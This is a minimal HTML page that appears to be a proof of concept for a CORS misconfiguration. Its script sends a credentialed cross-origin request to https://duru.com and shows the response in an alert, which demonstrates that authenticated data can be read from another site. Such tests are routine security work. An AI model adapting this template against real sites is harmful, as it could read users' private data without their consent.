<html>
<script>
            function cors() {
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    alert(xhr.responseText);
                }
            };
            xhr.open("GET", "https://duru.com", true);
            xhr.withCredentials = true;
            xhr.send();
            }

      
</script>
</html>
